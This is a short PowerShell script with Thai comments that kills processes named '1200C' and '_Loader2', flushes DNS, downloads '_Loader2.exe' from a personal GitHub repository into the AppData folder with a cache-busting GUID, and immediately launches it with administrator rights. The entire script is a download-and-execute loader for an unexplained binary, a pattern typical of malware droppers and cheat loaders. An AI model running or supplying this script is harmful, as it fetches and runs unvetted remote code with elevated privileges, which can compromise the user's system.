# 1. สั่งปิดโปรแกรมเดิมก่อน (ป้องกันไฟล์ติด Lock)
Stop-Process -Name "1200C" -ErrorAction SilentlyContinue
Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue

# 2. กำหนด Path ให้ชัดเจนว่าเป็น _Loader2
$exePath = "$env:APPDATA\_Loader2.exe"

# 3. ล้าง DNS Cache
ipconfig /flushdns

# 4. ตั้งค่า URL ไปที่ _Loader2.exe (เพิ่ม GUID เพื่อบังคับดึงตัวใหม่ล่าสุดจาก GitHub)
$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลดไฟล์ (ใช้โหมดดาวน์โหลดทับตัวเดิมไปเลย)
try {
    Write-Host "Downloading and starting _Loader2..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    Write-Host "Error: Cannot download _Loader2 from GitHub!" -ForegroundColor Red
    exit
}

# 6. รัน _Loader2 ขึ้นมาทันที
if (Test-Path $exePath) {
    Write-Host "Launching _Loader2..." -ForegroundColor Green
    Start-Process -FilePath $exePath -Verb RunAs
}
